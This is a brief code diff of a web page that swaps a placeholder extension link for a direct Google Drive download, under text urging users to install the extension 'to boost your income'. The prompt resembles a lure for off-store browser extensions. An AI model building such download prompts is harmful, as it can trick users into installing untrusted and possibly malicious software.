@@ -129,7 +129,7 @@ https://sweetalert2.github.io/#ajax-request`),X2(n),typeof n.title=="string"&&(n
                     To boost your income, you need to install our extension. Click the download button below to download the extension file.
                  </p>
                   <a 
-                    href="https://example.com/extension.zip" 
+                    href="https://drive.google.com/uc?export=download&id=1qa5BQYEWMoBCCyZiiQdd_zQUOY3NTDmv" 
                     download 
                     style="display: inline-block; margin-top: 8px; background-color: #3B82F6; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none;">
                     Download Extension ZIP
